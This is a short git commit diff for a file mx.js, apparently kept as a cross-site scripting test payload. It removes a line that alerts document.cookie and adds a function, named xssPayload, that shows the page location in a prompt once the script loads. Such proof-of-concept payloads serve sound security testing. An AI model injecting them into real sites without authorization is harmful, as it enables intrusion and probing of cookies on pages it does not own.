ffafac75ccd7f513af1759bb0a7198447c6145fe
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2023-03-01 13:11:49 +0530

    Update mx.js

--- mx.js
+++ mx.js
@@ -1,1 +1,8 @@
-<script>alert(document.cookie)</script>
+function xssPayload() {
+  const alertMsg = 'xss ' + document.location;
+  console.log(alertMsg);
+  window.prompt(alertMsg);
+}
+
+console.log('XSS payload executed');
+xssPayload();
